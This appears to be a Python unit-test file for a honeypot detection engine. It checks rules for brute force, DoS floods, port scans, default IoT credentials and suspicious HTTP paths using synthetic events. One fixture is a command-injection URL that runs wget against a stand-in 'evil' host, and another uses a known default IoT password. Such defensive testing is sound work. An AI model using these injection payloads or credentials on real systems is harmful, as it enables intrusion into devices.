"""Unit tests for the detection rules using synthetic events."""

from datetime import datetime, timedelta, timezone

from honeynet.config import DetectionConfig
from honeynet.detection.engine import DetectionEngine
from honeynet.models import Event, EventType


def _ts(base: datetime, seconds: float) -> str:
    return (base + timedelta(seconds=seconds)).isoformat()


def test_default_credentials_signature(engine):
    ev = Event(source_ip="10.0.0.5", honeypot="telnet",
               event_type=EventType.LOGIN_ATTEMPT,
               username="root", password="xc3511", success=True)
    alerts = engine.process(ev)
    assert any(a.rule_id == "IOT-DEFAULT-CREDS" for a in alerts)
    a = next(a for a in alerts if a.rule_id == "IOT-DEFAULT-CREDS")
    assert a.mitre_technique == "T1078.001"


def test_brute_force_threshold():
    engine = DetectionEngine(DetectionConfig(brute_force_threshold=5, brute_force_window=60))
    base = datetime.now(timezone.utc)
    alerts = []
    for i in range(5):
        alerts += engine.process(Event(
            source_ip="10.0.0.6", honeypot="telnet",
            event_type=EventType.LOGIN_ATTEMPT, username="root",
            password=f"wrong{i}", success=False, timestamp=_ts(base, i)))
    assert any(a.rule_id == "SSH-TELNET-BRUTE-FORCE" for a in alerts)


def test_brute_force_below_threshold_is_quiet():
    engine = DetectionEngine(DetectionConfig(brute_force_threshold=5))
    base = datetime.now(timezone.utc)
    alerts = []
    for i in range(3):
        alerts += engine.process(Event(
            source_ip="10.0.0.7", honeypot="telnet",
            event_type=EventType.LOGIN_ATTEMPT, password=f"x{i}",
            username="root", success=False, timestamp=_ts(base, i)))
    assert not any(a.rule_id == "SSH-TELNET-BRUTE-FORCE" for a in alerts)


def test_successful_logins_do_not_count_as_brute_force():
    engine = DetectionEngine(DetectionConfig(brute_force_threshold=3))
    alerts = []
    for i in range(5):
        alerts += engine.process(Event(
            source_ip="10.0.0.8", honeypot="telnet",
            event_type=EventType.LOGIN_ATTEMPT, username="root",
            password="root", success=True))
    assert not any(a.rule_id == "SSH-TELNET-BRUTE-FORCE" for a in alerts)


def test_dos_flood_detection():
    engine = DetectionEngine(DetectionConfig(dos_threshold=10, dos_window=10))
    base = datetime.now(timezone.utc)
    alerts = []
    for i in range(10):
        alerts += engine.process(Event(
            source_ip="10.0.0.9", honeypot="http",
            event_type=EventType.HTTP_REQUEST, http_path="/",
            timestamp=_ts(base, i * 0.1)))
    assert any(a.rule_id == "HTTP-DOS-FLOOD" for a in alerts)
    assert any(a.severity == "critical" for a in alerts)


def test_dos_window_expiry_prevents_false_positive():
    engine = DetectionEngine(DetectionConfig(dos_threshold=5, dos_window=10, alert_cooldown=0))
    base = datetime.now(timezone.utc)
    alerts = []
    # one request every 5s: never 5 within a 10s window
    for i in range(8):
        alerts += engine.process(Event(
            source_ip="10.0.0.10", honeypot="http",
            event_type=EventType.HTTP_REQUEST, timestamp=_ts(base, i * 5)))
    assert not any(a.rule_id == "HTTP-DOS-FLOOD" for a in alerts)


def test_port_scan_detection():
    engine = DetectionEngine(DetectionConfig(port_scan_threshold=8, port_scan_window=30))
    base = datetime.now(timezone.utc)
    alerts = []
    for i, port in enumerate([21, 22, 23, 25, 80, 443, 8080, 8443, 9000]):
        alerts += engine.process(Event(
            source_ip="10.0.0.11", honeypot="telnet",
            event_type=EventType.CONNECTION, dest_port=port,
            timestamp=_ts(base, i)))
    assert any(a.rule_id == "PORT-SCAN" for a in alerts)


def test_command_injection_signature(engine):
    ev = Event(source_ip="10.0.0.12", honeypot="http",
               event_type=EventType.HTTP_REQUEST,
               http_path="/cgi-bin/x?cmd=;wget http://evil/x.sh")
    alerts = engine.process(ev)
    assert any(a.rule_id == "CMD-INJECTION" for a in alerts)


def test_suspicious_path_signature(engine):
    ev = Event(source_ip="10.0.0.13", honeypot="http",
               event_type=EventType.HTTP_REQUEST, http_path="/boaform/admin/formLogin")
    alerts = engine.process(ev)
    assert any(a.rule_id == "SUSPICIOUS-HTTP-PATH" for a in alerts)


def test_alert_cooldown_suppresses_duplicates():
    engine = DetectionEngine(DetectionConfig(brute_force_threshold=3, alert_cooldown=300))
    base = datetime.now(timezone.utc)
    fired = 0
    for i in range(20):
        alerts = engine.process(Event(
            source_ip="10.0.0.14", honeypot="telnet",
            event_type=EventType.LOGIN_ATTEMPT, username="root",
            password=f"n{i}", success=False, timestamp=_ts(base, i)))
        fired += sum(1 for a in alerts if a.rule_id == "SSH-TELNET-BRUTE-FORCE")
    assert fired == 1  # cooldown collapses the storm into a single alert
